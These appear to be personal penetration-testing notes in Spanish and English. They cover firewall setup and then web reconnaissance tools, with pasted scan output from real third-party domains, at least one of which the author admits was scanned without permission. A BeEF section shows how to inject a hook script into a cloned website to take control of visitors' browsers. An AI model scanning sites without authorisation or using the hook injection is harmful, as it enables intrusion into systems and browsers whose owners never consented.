          Socks
          Telnet
          Transmission
          Transparent Proxy
          VNC
          WWW
          WWW Cache
          WWW Full
          WWW Secure
          XMPP
          Yahoo
          mosh
          qBittorrent
          svnserve        
        # activar un perfil, en este caso ssh y Nginx HTTPS
        sudo ufw allow “OpenSSH”
        sudo ufw allow "Nginx HTTPS"
        # Desactivar el perfile Nginx HTTPS
        sudo ufw delete allow "Nginx Full"

# Para ejecutar directamente en la consola como configuración inicial asumiendo que esta máquina no va a actuar como servidor de ningun tipo, solo va a navegar por internet:
ufw status
ufw default deny incoming
ufw default deny outgoing
ufw default deny routed
ufw allow in on lo
ufw deny in from 127.0.0.1/8
ufw allow out to any port 80
ufw allow out to any port 443
ufw allow out to any port 53
ufw enable
ufw status

# Hacking Web y Bug Bounty

    Una vez que hemos configurado nuestro entorno, voy a empezar a describir comandos y técnicas de seguridad informática ofensiva, pero antes,
    realizar estas técnicas en internet es claramente ilegal y peligroso, sobre todo siendo menores de edad. Siendo mayores de edad, si os pillan lanzando estas cosas
    sobre sistemas en internet, se os puede caer el pelo! por lo que, primero hay que aprender en un entorno controlado con máquinas virtualizadas corriendo en vuestra máquina anfitrión o en máquinas de internet preparadas especialmente para este propósito.

    Insisto, no ataqueis máquinas que no hayan firmado con vosotros algún contrato en el que se especifique que podéis hacerlo.

    This url is important: https://pentester.land/list-of-bug-bounty-writeups.html

    # Preparacion entornos vulnerables en local:

        Mutillidae ->
            Seguid instrucciones del siguiente sitio web:

                https://github.com/webpwnized/mutillidae
        Otro, id a vulnhub.com

            Buscad lo siguiente: vple

        https://www.vulnhub.com/entry/vulnerable-pentesting-lab-environment-1,737/

    # Identificacion Subdominios.

    Muchas veces, una máquina en internet alberga multiples dominios, bien pertenecientes a una misma organización o pertenecientes a distintas organizaciones,
    es decir, recursos de páginas web, para encontrarlas, existen multitud de herramientas, una es subfinder.

        1. Subfinder

            https://github.com/projectdiscovery/subfinder

            > subfinder -d meristation.com > output-meristation.txt

                    _     __ _         _         
            ____  _| |__ / _(_)_ _  __| |___ _ _
            (_-< || | '_ \  _| | ' \/ _  / -_) '_|
            /__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2

                            projectdiscovery.io

            [WRN] Use with caution. You are responsible for your actions
            [WRN] Developers assume no liability and are not responsible for any misuse or damage.
            [WRN] By using subfinder, you also agree to the terms of the APIs used.

            [INF] Enumerating subdomains for meristation.com
            ...
             ⭐  ~  ok  took 47s  at 12:29:17 >  

            Vale, no tenía permiso de meristation.com, pero no lo hagáis!

            Lo interesante de esta aplicacion es que se puede enlazar con otras, por ejemplo:

             > subfinder -d meristation.com -silent  | httpx -silent -threads 80 -ports 80,443,8080,8443,4443,4000,5000,9001 | nuclei -tags  log4j

                                 __     _
               ____  __  _______/ /__  (_)
              / __ \/ / / / ___/ / _ \/ /
             / / / / /_/ / /__/ /  __/ /
            /_/ /_/\__,_/\___/_/\___/_/   2.6.5

                            projectdiscovery.io

            [WRN] Use with caution. You are responsible for your actions.
            [WRN] Developers assume no liability and are not responsible for any misuse or damage.
            [WRN] Found 50 templates with syntax warning (use -validate flag for further examination)
            [WRN] Found 55 templates with syntax error (use -validate flag for further examination)
            [INF] Using Nuclei Engine 2.6.5 (outdated)
            [INF] Using Nuclei Templates 9.1.7 (latest)
            [INF] Templates added in last update: 45
            [INF] Templates loaded for scan: 25
            [INF] Using Interactsh Server: oast.site
            [INF] No results found. Better luck next time!

             ⭐  ~  ok  took 3m 9s  at 12:35:59 >  

            Busco en los subdominios de esa url, a través de los puertos descritos en httpx, si la libreria log4j está siendo usada...
            Es decir, el comando anterior sirve para encontrar si dicha url está usando la libreria log4j, (uso la app nuclei para saberlo), en alguno de los servicios que están ocupando algunos de los puertos usados por httpx.

            Vale, me doy cuenta que para ser el primero, es un poco heavy, pero esto sirve para recordaros que los comandos linux/unix se pueden encadenar mediante la tuberia |
            es decir, coger la salida de un comando para que sirva de entrada para el siguiente. Muy poderoso.
            La tuberia sale pulsando la combinación Option 1 en mi macbook pro.

        2. Sublist3r

        Parecido a subfinder.

            https://github.com/aboul3la/Sublist3r

            > sublist3r -d hackthissite.org -v

                 ____        _     _ _     _   _____                                                                                                                                                          
                / ___| _   _| |__ | (_)___| |_|___ / _ __                                                                                                                                                     
                \___ \| | | | '_ \| | / __| __| |_ \| '__|                                                                                                                                                    
                 ___) | |_| | |_) | | \__ \ |_ ___) | |                                                                                                                                                       
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|                                                                                                                                                       

                # Coded By Ahmed Aboul-Ela - @aboul3la                                                                                                                                                        

                [-] Enumerating subdomains now for hackthissite.org                                                                                                                                                           
                [-] verbosity is enabled, will show the subdomains results in realtime
                [-] Searching now in Baidu..
                [-] Searching now in Yahoo..
                [-] Searching now in Google..
                [-] Searching now in Bing..
                [-] Searching now in Ask..
                [-] Searching now in Netcraft..
                [-] Searching now in DNSdumpster..
                [-] Searching now in Virustotal..
                [-] Searching now in ThreatCrowd..
                [-] Searching now in SSL Certificates..
                [-] Searching now in PassiveDNS..
                [!] Error: Virustotal probably now is blocking our requests

                 ⭐  ~  ok  took 12s  at 12:42:43 >

                 No se si será porque estoy lanzando peticiones a cascoporro, pero no me muestra ningún resultado y eso no es normal.    

        3. Subbrute

        Parecido a los anteriores, pero ésta hace técnica de fuerza bruta probando todas las combinaciones posibles. Muy intrusiva, genera mucho tráfico, os pillan seguro.

        Se suele usar con la otra app, haciendo un -b

            > sublist3r -d hackthissite.org -v -b
            ...

    # Identificando tecnologías web detrás de un dominio.

        1. Whatweb

            https://github.com/urbanadventurer/WhatWeb

            > whatweb 156.242.11.17 -a 1
            http://156.242.11.17 [200 OK] HTTPServer[nginx], IP[156.242.11.17], Open-Graph-Protocol[website], Script, nginx

            ⭐  ~  ok  at 13:19:14 >   

            # Probably by default is fine. Do not use -a 4 flag (agressive)
            > whatweb -v www.nintendotw.vip
            WhatWeb report for http://www.nintendotw.vip
            Status    : 301 Moved Permanently
            Title     : 301 Moved Permanently
            IP        : <Unknown>
            Country   : <Unknown>

            Summary   : HTTPServer[nginx], nginx, RedirectLocation[https://www.nintendotw.vip/], Strict-Transport-Security[max-age=31536000]

            Detected Plugins:
            [ HTTPServer ]
                    HTTP server header string. This plugin also attempts to
                    identify the operating system from the server header.

                    String       : nginx (from server string)

            [ RedirectLocation ]
                    HTTP Server string location. used with http-status 301 and
                    302

                    String       : https://www.nintendotw.vip/ (from location)

            [ Strict-Transport-Security ]
                    Strict-Transport-Security is an HTTP header that restricts
                    a web browser from accessing a website without the security
                    of the HTTPS protocol.

                    String       : max-age=31536000

            [ nginx ]
                    Nginx (Engine-X) is a free, open-source, high-performance
                    HTTP server and reverse proxy, as well as an IMAP/POP3
                    proxy server.

                    Website     : http://nginx.net/

            HTTP Headers:
                    HTTP/1.1 301 Moved Permanently
                    Server: nginx
                    Date: Mon, 29 Aug 2022 15:25:30 GMT
                    Content-Type: text/html
                    Content-Length: 162
                    Connection: close
                    Location: https://www.nintendotw.vip/
                    Strict-Transport-Security: max-age=31536000

            WhatWeb report for https://www.nintendotw.vip/
            Status    : 301 Moved Permanently
            Title     : <None>
            IP        : <Unknown>
            Country   : <Unknown>

            Summary   : Cookies[s0df1cc73], HTTPServer[nginx], HttpOnly[s0df1cc73], nginx, RedirectLocation[/index/user/login.html], Strict-Transport-Security[max-age=31536000]

            Detected Plugins:
            [ Cookies ]
                    Display the names of cookies in the HTTP headers. The
                    values are not returned to save on space.

                    String       : s0df1cc73

            [ HTTPServer ]
                    HTTP server header string. This plugin also attempts to
                    identify the operating system from the server header.

                    String       : nginx (from server string)

            [ HttpOnly ]
                    If the HttpOnly flag is included in the HTTP set-cookie
                    response header and the browser supports it then the cookie
                    cannot be accessed through client side script - More Info:
                    http://en.wikipedia.org/wiki/HTTP_cookie

                    String       : s0df1cc73

            [ RedirectLocation ]
                    HTTP Server string location. used with http-status 301 and
                    302

                    String       : /index/user/login.html (from location)

            [ Strict-Transport-Security ]
                    Strict-Transport-Security is an HTTP header that restricts
                    a web browser from accessing a website without the security
                    of the HTTPS protocol.

                    String       : max-age=31536000

            [ nginx ]
                    Nginx (Engine-X) is a free, open-source, high-performance
                    HTTP server and reverse proxy, as well as an IMAP/POP3
                    proxy server.

                    Website     : http://nginx.net/

            HTTP Headers:
                    HTTP/1.1 301 Moved Permanently
                    Server: nginx
                    Date: Mon, 29 Aug 2022 15:25:33 GMT
                    Content-Type: text/html; charset=utf-8
                    Transfer-Encoding: chunked
                    Connection: close
                    Set-Cookie: s0df1cc73=mh6g5qcsg4bm4sbkie1tn4pdnt; path=/; HttpOnly
                    Expires: Thu, 19 Nov 1981 08:52:00 GMT
                    Pragma: no-cache
                    Cache-control: no-cache,must-revalidate
                    Location: /index/user/login.html
                    Strict-Transport-Security: max-age=31536000

            WhatWeb report for https://www.nintendotw.vip/index/user/login.html
            Status    : 200 OK
            Title     : 登錄
            IP        : <Unknown>
            Country   : <Unknown>

            Summary   : Bootstrap, Cookies[s0df1cc73], HTML5, HTTPServer[nginx], HttpOnly[s0df1cc73], JQuery[3.3.1], nginx, PasswordField[pwd], Script[application/javascript,text/javascript], Strict-Transport-Security[max-age=31536000]

            Detected Plugins:
            [ Bootstrap ]
                    Bootstrap is an open source toolkit for developing with
                    HTML, CSS, and JS.

                    Website     : https://getbootstrap.com/

            [ Cookies ]
                    Display the names of cookies in the HTTP headers. The
                    values are not returned to save on space.

                    String       : s0df1cc73

            [ HTML5 ]
                    HTML version 5, detected by the doctype declaration


            [ HTTPServer ]
                    HTTP server header string. This plugin also attempts to
                    identify the operating system from the server header.

                    String       : nginx (from server string)

            [ HttpOnly ]
                    If the HttpOnly flag is included in the HTTP set-cookie
                    response header and the browser supports it then the cookie
                    cannot be accessed through client side script - More Info:
                    http://en.wikipedia.org/wiki/HTTP_cookie

                    String       : s0df1cc73

            [ JQuery ]
                    A fast, concise, JavaScript that simplifies how to traverse
                    HTML documents, handle events, perform animations, and add
                    AJAX.

                    Version      : 3.3.1
                    Website     : http://jquery.com/

            [ PasswordField ]
                    find password fields

                    String       : pwd (from field name)

            [ Script ]
                    This plugin detects instances of script HTML elements and
                    returns the script language/type.

                    String       : application/javascript,text/javascript

            [ Strict-Transport-Security ]
                    Strict-Transport-Security is an HTTP header that restricts
                    a web browser from accessing a website without the security
                    of the HTTPS protocol.

                    String       : max-age=31536000

            [ nginx ]
                    Nginx (Engine-X) is a free, open-source, high-performance
                    HTTP server and reverse proxy, as well as an IMAP/POP3
                    proxy server.

                    Website     : http://nginx.net/

            HTTP Headers:
                    HTTP/1.1 200 OK
                    Server: nginx
                    Date: Mon, 29 Aug 2022 15:25:35 GMT
                    Content-Type: text/html; charset=utf-8
                    Transfer-Encoding: chunked
                    Connection: close
                    Vary: Accept-Encoding
                    Set-Cookie: s0df1cc73=0k81l1nrbvjbq83081n7c12t75; path=/; HttpOnly
                    Expires: Thu, 19 Nov 1981 08:52:00 GMT
                    Cache-Control: no-store, no-cache, must-revalidate
                    Pragma: no-cache
                    Strict-Transport-Security: max-age=31536000
                    Content-Encoding: gzip


            ⭐  ~/CheatSheetsHacking  ok  took 10s  at 17:25:38 >

        2. WebAnalyze

            https://github.com/rverton/webanalyze

            > webanalyze -host 156.242.11.17  -crawl 1
             :: webanalyze        : v0.3.7
             :: workers           : 4
             :: apps              : technologies.json
             :: crawl count       : 1
             :: search subdomains : true
             :: follow redirects  : false

            http://156.242.11.17 (0.4s):
                Nginx,  (Web servers, Reverse proxies)

            ⭐  ~  ok  at 13:30:50 >   

            # Content Discovery. dirbuster. Reconocimiento activo

            dirbuster -u https://nintendotw.vip

            The tool is going to create REST petitions with the file you have to provide.
            The purpose is to brute force information from victim`s folders...

            You can use files from this folder: /usr/share/wordlist/dirbuster/
            > ls -ltah /usr/share/wordlists/dirbuster/
            total 7.5M
            drwxr-xr-x 2 root root 4.0K Feb 11  2022 .
            drwxr-xr-x 4 root root 4.0K Feb 11  2022 ..
            -rw-r--r-- 1 root root  70K Feb 27  2009 apache-user-enum-1.0.txt
            -rw-r--r-- 1 root root  89K Feb 27  2009 apache-user-enum-2.0.txt
            -rw-r--r-- 1 root root 534K Feb 27  2009 directories.jbrofuzz
            -rw-r--r-- 1 root root 1.8M Feb 27  2009 directory-list-1.0.txt
            -rw-r--r-- 1 root root 1.9M Feb 27  2009 directory-list-2.3-medium.txt
            -rw-r--r-- 1 root root 709K Feb 27  2009 directory-list-2.3-small.txt
            -rw-r--r-- 1 root root 1.8M Feb 27  2009 directory-list-lowercase-2.3-medium.txt
            -rw-r--r-- 1 root root 661K Feb 27  2009 directory-list-lowercase-2.3-small.txt

            # Content Discovery. Gobuster y Seclist

                Es parecida a la anterior, hace fuerza bruta para descubrir ficheros y directorios, permite trabajar tambien con aws...

                https://github.com/OJ/gobuster
                https://github.com/danielmiessler/SecLists

                > ls -ltah /usr/share/seclists/
                total 80K
                drwxr-xr-x 426 root root  20K Aug 29 19:01 ..
                drwxr-xr-x  10 root root 4.0K Aug  4 20:41 Web-Shells
                drwxr-xr-x  11 root root 4.0K Aug  4 20:41 .
                drwxr-xr-x  12 root root  12K Aug  4 20:41 Passwords
                drwxr-xr-x   3 root root 4.0K Aug  4 20:41 Pattern-Matching
                drwxr-xr-x   8 root root 4.0K Aug  4 20:41 Payloads
                drwxr-xr-x   4 root root 4.0K Aug  4 20:41 Usernames
                drwxr-xr-x   7 root root 4.0K Aug  4 20:41 Miscellaneous
                drwxr-xr-x   9 root root  12K Aug  4 20:41 Fuzzing
                drwxr-xr-x   2 root root 4.0K Aug  4 20:41 IOCs
                -rw-r--r--   1 root root 2.1K Aug  2 11:51 README.md
                drwxr-xr-x   9 root root 4.0K Apr  3 13:44 Discovery

                ⭐  ~/CheatSheetsHacking  ok  at 19:12:02 > gobuster dir -u as.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --wildcard
                ...

                > gobuster dir -u https://www.nintendotw.vip  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --wildcard
                ===============================================================
                Gobuster v3.0.1
                by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
                ===============================================================
                [+] Url:            https://www.nintendotw.vip
                [+] Threads:        10
                [+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
                [+] Status codes:   200,204,301,302,307,401,403
                [+] User Agent:     gobuster/3.0.1
                [+] Timeout:        10s
                ===============================================================
                2022/08/30 11:36:55 Starting gobuster
                ===============================================================
                /index (Status: 301)
                ...

        # Vulnerability Android/iOS apps

            Android:

                https://ibotpeaches.github.io/Apktool/

                https://github.com/iBotPeaches/Apktool

                S4vitar!!
                https://www.youtube.com/watch?v=V_q99IIzza4

            Android/iOS:

                https://github.com/MobSF/Mobile-Security-Framework-MobSF


        # Vulnerability analysis web apps

            # Beef

                There are sometimes that the only way to conduct a pentesting is through the website, so Beef could help you.

                https://beefproject.com

                https://github.com/beefproject/beef

                Cómo funciona?

                    https://www.youtube.com/watch?v=3ogyS4KOlXc

                BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.

                Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.

                It is installed by default in kali, but in the time of writing, beef was broken, probably due to a broken gem dependency, so i had to create
                a docker container from scratch, modify a bit config.yaml file and run it using docker.
                Probably, the best way to run this is through a cloud server, like Linode or whatever with already preinstalled...

                # Docker way
                # Download the Source Code

                    > git clone https://github.com/beefproject/beef  

                # Setting Your Credentials

                    It is essential that you set your credentials BEFORE building your Docker image. BeEF by default has it's credentials set to beef:beef, but does not allow authentication with default credentials. Consequently if you build an image without changing the credentials you will not be able to authenticate your container's BeEF instance.

                    With your preferred text editor open the config.yaml file found in the BeEF root folder:

                      ...SNIP...
                        credentials:
                          user: '<YOUR_USERNAME>'
                          passwd: '<YOUR_PASSWORD>'
                      ...SNIP...

                # Building Your Image & Container

                    To build your image:

                    > docker build -t beef .

                # To run your container, If you'd prefer the container to run backgrounded/detached just add the -d tag to the command below

                    > docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 -d --name beef beef

                # Optional, you can run beef behind a NAT with ngrok, but i truly recommend you to run it in a cloud server.

                # Finally, to run Beef in a real scenario, you should not use the default webpage provided by the framework,
                you should create your own website or even better, clone it using wget
                 and finally you only have to add this html tag bellow <head> tag :

                    <script src="htts://beef.local:3000/hook.js"></script>

                or

                    (Need to be tested!)

                    https://hackingvision.com/2018/12/15/cloning-websites-beef-xss/

                <script>
                var commandModuleStr = ‘<script src”‘ + window.location.protocol
                                                      + ‘//‘ + windows.location.host
                                                      + ‘<%= @hook_uri %>” type=“text/javascript”><\/script>’;
                document.write(commandModuleStr);
                </script>

                # You can integrate metasploit with beef. Probably you will want to do it:

                    https://www.youtube.com/watch?v=4t4kBkMsDbQ
            # Nessus

                https://kali:8834/#/scans/folders/my-scans

            # Zap Proxy

                Es como Burp Suite, pero con más recursos, un interceptor proxy, busca vulnerabilidades de manera activa o pasiva.
                Very intrusive! generates a lot of http traffic.

                > sudo apt install zaproxy
                ...
                https://www.udemy.com/course/curso-profesional-de-hacking-etico-y-ciberseguridad/learn/lecture/30766090#overview
                https://www.zaproxy.org/addons/
                https://snifer.gitbooks.io/owasp-zed-attack-proxy-guide/content/

            # Nikto

            > nikto  -h https://cncintel.com/\?fbclid\=IwAR3stjMT-yIM-yJ1RI4mU2X0ZmaSeMU6A1morNu-lE8ST9iNYJ0gYcj32a4 -o output-cncintel.htlml -Format html
            - Nikto v2.1.6
            ---------------------------------------------------------------------------
            + Target IP:          172.66.42.210
            + Target Hostname:    cncintel.com
            + Target Port:        443
            ---------------------------------------------------------------------------
            + SSL Info:        Subject:  /C=US/ST=California/L=San Francisco/O=Cloudflare, Inc./CN=sni.cloudflaressl.com
                               Ciphers:  TLS_AES_256_GCM_SHA384
                               Issuer:   /C=US/O=Cloudflare, Inc./CN=Cloudflare Inc ECC CA-3
            + Message:            Multiple IP addresses found: 172.66.42.210, 172.66.41.46
            + Start Time:         2022-08-30 17:37:29 (GMT2)
            ---------------------------------------------------------------------------
            + Server: cloudflare
            + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
            + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
            + Expect-CT is not enforced, upon receiving an invalid Certificate Transparency Log, the connection will not be dropped.
            + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
            + All CGI directories 'found', use '-C none' to test none
            + Hostname 'cncintel.com' does not match certificate's names: sni.cloudflaressl.com
            + ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: SSL negotiation failed: error:0A000410:SSL routines::sslv3 alert handshake failure at /var/lib/nikto/plugins/LW2.pm line 5157.
             at /var/lib/nikto/plugins/LW2.pm line 5157.
            ;  at /var/lib/nikto/plugins/LW2.pm line 5157.
            + SCAN TERMINATED:  20 error(s) and 5 item(s) reported on remote host
            + End Time:           2022-08-30 17:38:26 (GMT2) (57 seconds)
            ---------------------------------------------------------------------------
            + 1 host(s) tested

             ⭐  ~/CheatSheetsHacking  err 1  took 59s  at 17:38:26 >

            # Skipfish. very intrussive.

                > skipfish -o report-cnc https://cncintel.com/  
                ...

            # Photon

              Un crawler para OSINT (Inteligencia de fuentes abiertas por sus siglas en inglés).
              Un crawler es un rastreador web o araña, muy parecido a lo que utilizaría un motor de búsqueda. Extrae información de las webs y las categoriza. Su uso más común es el de realizar búsquedas en Internet, pero, se le pueden dar otros usos enfocados a la minería de datos. Photon está escrito en Python 3 y disponible en Github en la siguiente url: https://github.com/s0md3v/Photon.
              Photon nos permite extraer la siguiente información:
              URLs
              URLs con parámetros
              Intel (correos, cuentas en redes sociales, amazon buckets, etc.)
              Archivos (PDF, PNG, XML, etc.)
              Claves secretas (Api Keys & hashes)
              Archivos JavaScript y Endpoints presentes en ellos.
              Strings que coinciden con el patrón de expresiones personalizado.
              Subdominios e información e los DNS.
              Todo ello lo extrae de forma organizada y puede ser almacenado en un JSON.

              Posee además varios plugins con los que se pueden ampliar las búsquedas.

              Ahora vamos a pasar a ver el crawler funcionando. Pero antes, vamos a proceder a su instalación.

              Funcionamiento e instalación de Photon

              Para instalarlo debemos hacer una serie de sencillos pasos. Si queremos usarlo con Docker podemos encontrar una guía en el propio proyecto de Github.

              Lo primero que vamos a hacer es clonar el proyecto en la ruta que queramos:
              Lo típico, creamos un directorio, vas alli, ejecutas el siguiente comando:
              
                git clone https://github.com/s0md3v/Photon

              Acto seguido vamos a pasar a instalar los requisitos de la instalación del archivo, es decir, algunos módulos de Python que necesitaremos para usar el proyecto. Estos vienen en un archivo dentro del proyecto denominado “requirements.txt”. Podemos instalarlos tanto de forma manual cómo de la forma rápida.

              Para instalar, usamos pip3:

                ┌<▸> ~/g/Photon 
                └➤ pip3 install -r requirements.txt
                Requirement already satisfied: requests in /usr/local/lib/python3.10/site-packages (from -r requirements.txt (line 1)) (2.28.1)
                Requirement already satisfied: urllib3 in /usr/local/lib/python3.10/site-packages (from -r requirements.txt (line 3)) (1.26.12)
                Collecting tld
                  Downloading tld-0.12.6-py39-none-any.whl (412 kB)
                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 412.2/412.2 kB 6.5 MB/s eta 0:00:00
                Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/site-packages (from requests->-r requirements.txt (line 1)) (2022.9.14)
                Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/site-packages (from requests->-r requirements.txt (line 1)) (3.4)
                Requirement already satisfied: charset-normalizer<3,>=2 in /usr/local/lib/python3.10/site-packages (from requests->-r requirements.txt (line 1)) (2.1.1)
                Collecting PySocks!=1.5.7,>=1.5.6
                  Downloading PySocks-1.7.1-py3-none-any.whl (16 kB)
                Installing collected packages: tld, PySocks
                Successfully installed PySocks-1.7.1 tld-0.12.6

              Para ejecutar por ejemplo contra google.com:
              
                ┌<▸> ~/g/Photon 
                └➤ python3 photon.py -u google.com -e csv -t 50
                      ____  __          __
                     / __ \/ /_  ____  / /_____  ____
                    / /_/ / __ \/ __ \/ __/ __ \/ __ \
                   / ____/ / / / /_/ / /_/ /_/ / / / /
                  /_/   /_/ /_/\____/\__/\____/_/ /_/ v1.3.2

                 URLs retrieved from robots.txt: 241
                 URLs retrieved from sitemap.xml: 24
                 Level 1: 266 URLs
                 Progress: 266/266
                 Crawling 0 JavaScript files

                --------------------------------------------------
                 Intel: 3
                 Robots: 241
                 Internal: 266
                 External: 2
                 Fuzzable: 7
                --------------------------------------------------
                 Total requests made: 267
                 Total time taken: 0 minutes 5 seconds
                 Requests per second: 47
                 Results saved in google.com directory

              Los resultados se han guardado en un directorio recien creado google.com, con ficheros en formato csv.
              
                ┌<▸> ~/g/Photon 
                └➤ ls
                CHANGELOG.md        LICENSE.md      README.md       external.txt        google.com      internal.txt        plugins         robots.txt
                Dockerfile      MANIFEST.in     core            fuzzable.txt        intel.txt       photon.py       requirements.txt

                Una vez se ha completado la instalación con éxito podremos usarlo. En este caso no hemos instalado ningún plugin.

                Para ver las opciones que permite Photon bastaría con escribir en la shell: python3 photon.py -h

            # Arjun

                Arjun can find query parameters for URL endpoints.

                https://github.com/s0md3v/Arjun

            # smap

                nmap a través de shodan.

                ┌<▸> ~/g/CheatSheetsHacking 
                └➤ smap -sV vermont-solutions.com 
                Starting Nmap 9.99 ( https://nmap.org ) at 2022-10-10 11:37 CEST
                Nmap scan report for vermont-solutions.com (217.160.0.210)
                Host is up.
                rDNS record for 217.160.0.210: 217-160-0-210.elastic-ssl.ui-r.com

                PORT    STATE SERVICE     VERSION
                80/tcp  open  http        nginx
                81/tcp  open  hosts2-ns?  
                443/tcp open  https?      

                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds

                Mira la diferencia si hacemos un scan activo.
                
                ┌<▸> ~/g/CheatSheetsHacking 
                └➤ nmap -sV vermont-solutions.com
                Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-10 11:37 CEST
                Nmap scan report for vermont-solutions.com (217.160.0.210)
                Host is up (0.055s latency).
                Other addresses for vermont-solutions.com (not scanned): 2001:8d8:100f:f000::283
                rDNS record for 217.160.0.210: 217-160-0-210.elastic-ssl.ui-r.com
                Not shown: 940 filtered tcp ports (no-response), 57 closed tcp ports (conn-refused)
                PORT    STATE SERVICE  VERSION
                80/tcp  open  http     nginx
                81/tcp  open  http     nginx
                443/tcp open  ssl/http nginx

                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 57.36 seconds
            # Dmitry. Deepmagic Information Gathering Tool.

                It is the first tool that gives me real ips beyond the ones protected by cloudflare.

                > sudo apt install dmitry

                https://github.com/jaygreig86/dmitry/

                Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:

                > sudo dmitry -winsepo output.txt target.com

                Generamos un fichero host-cncintel.com al escanear el sitio web malicioso cncintel.com

                > sudo dmitry -winsepfb -o host-cncintel.com.txt cncintel.com

            # OpenVas. Like Nessus

                OpenVAS is a full-featured vulnerability scanner. Its capabilities include unauthenticated and authenticated testing, various high-level and low-level internet and industrial protocols, performance tuning for large-scale scans and a powerful internal programming language to implement any type of vulnerability test.
                The scanner obtains the tests for detecting vulnerabilities from a feed that has a long history and daily updates.

                It needs one hour, depending of your machine, to install itself in your machine.

                https://www.openvas.org/

                > sudo apt update && apt upgrade -y
                > sudo apt install openvas
                > sudo gvm-setup
                > sudo gvm-check-setup
                > sudo gvm-start

                open a web browser manually and enter the URL
                https://127.0.0.1:9392

                Forgot your Admin Password?
                Reset it by typing: sudo gvmd – user=admin – new-password=passwd;

                how to set up the Scans / Tasks to start the first scan. But while setting up the 1st scan, I had some errors and I also explained how I fixed that error as well.
                These are the commands I used to fix the error
                > sudo runuser -u _gvm -- greenbone-nvt-sync
                > sudo runuser -u _gvm -- gvmd --get-scanners
                (note your scanner id)
                > sudo runuser -u _gvm -- gvmd --get-users --verbose
                (note your user id)
                > sudo runuser -u _gvm -- gvmd --modify-scanner [scanner id] --value [user id]

            # Faraday.

                Instalado por defecto en kali

                https://github.com/infobyte/faraday
                > faraday
                [sudo] password for kali:
                >>> Init database
                No storage section or path in the .faraday/config/server.ini. Setting the default value to .faraday/storage
                /usr/lib/python3/dist-packages/flask_sqlalchemy/__init__.py:851: UserWarning: Neither SQLALCHEMY_DATABASE_URI nor SQLALCHEMY_BINDS is set. Defaulting SQLALCHEMY_DATABASE_URI to "sqlite:///:memory:".
                  warnings.warn(
                This script will  create a new postgres user  and  save faraday-server settings (server.ini).
                Creating database faraday                                                                                                                                                                                    
                Saving database credentials file in /root/.faraday/config/server.ini                                                                                                                                         
                Creating tables                                                                                                                                                                                              
                INFO  [alembic.runtime.migration] Context impl PostgresqlImpl.                                                                                                                                               
                INFO  [alembic.runtime.migration] Will assume transactional DDL.                                                                                                                                             
                INFO  [alembic.runtime.migration] Running stamp_revision  -> 5cf9660bba80                                                                                                                                    
                Admin user created with                                                                                                                                                                                      

                username: faraday                                                                                                                                                                                            
                password: some-random-password                                                                                                                                                                                       

                >>> Start faraday.service                                                                                                                                                                                    
                Please, set a new password for the Faraday's default user 'faraday'
                Username: kali    
                Password:
                Repeat for confirmation:
                User not found in Faraday's Database

                http://localhost:5985/#/workspaces

            # Nuclei, nuclei-templates

                https://github.com/projectdiscovery/nuclei

                Util porque se puede integrar en un pipeline CI/CD, también se puede apuntar contra un host,
                no solo servicios http.

                > nuclei -u https://cncintel.com -t nuclei-templates/cves/

                                     __     _
                   ____  __  _______/ /__  (_)
                  / __ \/ / / / ___/ / _ \/ /
                 / / / / /_/ / /__/ /  __/ /
                /_/ /_/\__,_/\___/_/\___/_/   2.6.5

                                projectdiscovery.io

                [WRN] Use with caution. You are responsible for your actions.
                [WRN] Developers assume no liability and are not responsible for any misuse or damage.
                [WRN] Found 31 templates with syntax warning (use -validate flag for further examination)
                [WRN] Found 31 templates with syntax error (use -validate flag for further examination)
                [WRN] Found 11 templates with runtime error (use -validate flag for further examination)
                [INF] Using Nuclei Engine 2.6.5 (outdated)
                [INF] Using Nuclei Templates 9.1.7 (latest)
                [INF] Templates added in last update: 45
                [INF] Templates loaded for scan: 1318
                [INF] Templates clustered: 12 (Reduced 7 HTTP Requests)
                [INF] Using Interactsh Server: oast.online
                [INF] No results found. Better luck next time!
                > nuclei --update-templates

                                     __     _
                   ____  __  _______/ /__  (_)
                  / __ \/ / / / ___/ / _ \/ /
                 / / / / /_/ / /__/ /  __/ /
                /_/ /_/\__,_/\___/_/\___/_/   2.6.5

                                projectdiscovery.io

                [WRN] Use with caution. You are responsible for your actions.
                [WRN] Developers assume no liability and are not responsible for any misuse or damage.
                [INF] No new updates found for nuclei templates

                 ⭐  ~  ok  at 18:18:43 >  

            # Fuzzing básico. ffuz

                Consiste en enviar parámetros de entrada raros a una página web,largos, para tratar de romper la aplicacion, o para encontrar recursos ocultos.

                Como si le das a tu abuela el ordenador para que pruebe la app o se la dejas a un ladrón para encontrar las joyas ocultas de un futbolista.

                wfuz -> https://github.com/xmendez/wfuzz
                Está en kali por defecto

                ffuz -> https://github.com/ffuf/ffuf
                También está en kali por defecto.

